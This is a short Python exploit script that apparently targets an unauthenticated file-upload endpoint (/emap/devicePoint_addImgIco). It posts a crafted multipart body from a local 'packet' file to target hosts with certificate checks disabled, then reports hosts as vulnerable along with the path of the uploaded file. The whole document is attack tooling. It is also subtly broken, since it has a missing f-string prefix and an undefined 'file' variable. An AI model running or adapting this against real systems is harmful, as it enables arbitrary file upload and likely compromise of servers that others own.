import argparse
import time
import requests
from urllib.parse import urlparse

with open("./packet", "r") as fdata:
    body = fdata.read()
body = body.replace("\n", "\r\n")

def get_url(file):
            send_req(r"https://{file}")
            send_req(r"http://{file}")

def send_req(url_check):
    print('{} runing Check'.format(url_check))
    url = url_check + '/emap/devicePoint_addImgIco?hasSubsystem=true'
    header = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edg/110.0.1587.69',
        'Content-Type':'multipart/form-data; boundary=A9-oH6XdEkeyrNu4cNSk-ppZB059oDDT',
        'Accept':'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
        'Connection':'close'
    }
    
    requests.packages.urllib3.disable_warnings()
    response = requests.post(url=url,headers=header,data=body,verify=False,timeout=5).json()
    #print("resrponse:"+response)
    if response['code'] == 1:
        result = '{} is vulnerable.\t{}\n'.format(url_check, url_check + "/upload/emap/society_new/" + response['data'])
        print(result)
        parsed_url = urlparse(url_check)
        hostname = parsed_url.hostname


if __name__ == '__main__':
    if file is None:
        print('please input target')
    else:
        get_url(file)
